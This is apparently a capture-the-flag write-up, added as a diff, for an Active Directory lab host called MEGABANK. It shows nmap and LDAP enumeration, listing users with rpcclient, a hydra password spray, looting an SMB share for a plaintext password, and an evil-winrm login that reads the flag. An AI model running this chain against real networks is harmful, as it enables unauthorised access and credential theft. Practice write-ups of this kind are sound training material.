@@ -1,0 +1,72 @@
+I start off with an nmap scan:
+└─# nmap -sC -sV -A 10.10.10.172
+PORT     STATE SERVICE       VERSION
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-18 21:36:48Z)
+135/tcp  open  msrpc?
+139/tcp  open  netbios-ssn?
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+
+Host script results:
+|_clock-skew: 1m50s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-06-18T21:37:05
+|_  start_date: N/A
+
+I start off an ldap search :
+└─# ldapsearch -x -h 10.10.10.172 -s base namingcontexts
+namingcontexts: DC=MEGABANK,DC=LOCAL
+namingcontexts: CN=Configuration,DC=MEGABANK,DC=LOCAL
+namingcontexts: CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+
+└─# ldapsearch -x -h 10.10.10.172 -s sub -b 'DC=megabank,DC=local' > ldap
+└─# rpcclient 10.10.10.172 -U '' -N
+rpcclient $> enumdomusers
+Guest
+mhope
+SABatchJobs
+svc-ata
+svc-bexec
+svc-netapp
+dgalanos
+roleary
+smorgan
+└─# hydra -L users -P users 10.10.10.172 ldap2
+[389][ldap2] host: 10.10.10.172   login: SABatchJobs   password: SABatchJobs
+
+└─# smbclient -U SABatchJobs -L \\10.10.10.172
+Enter WORKGROUP\SABatchJobs's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	azure_uploads   Disk      
+	C$              Disk      Default share
+	E$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+	users$          Disk 
+  └─# smbclient \\\\10.10.10.172\\users$ -U SABatchJobs SABatchJobs
+  smb: \mhope\> dir
+  azure.xml                          AR     1212  Fri Jan  3 16:40:23 2020
+
+smb: \mhope\> get azure.xml
+
+The azure xml file has a password 
+"Password">4n0therD4y@n0th3r$
+
+└─# evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
+
+*Evil-WinRM* PS C:\Users\mhope\Documents> cd ../desktop
+*Evil-WinRM* PS C:\Users\mhope\desktop> type user.txt
+4961976bd7d8f4eeb2ce3705e2f212f2
+  
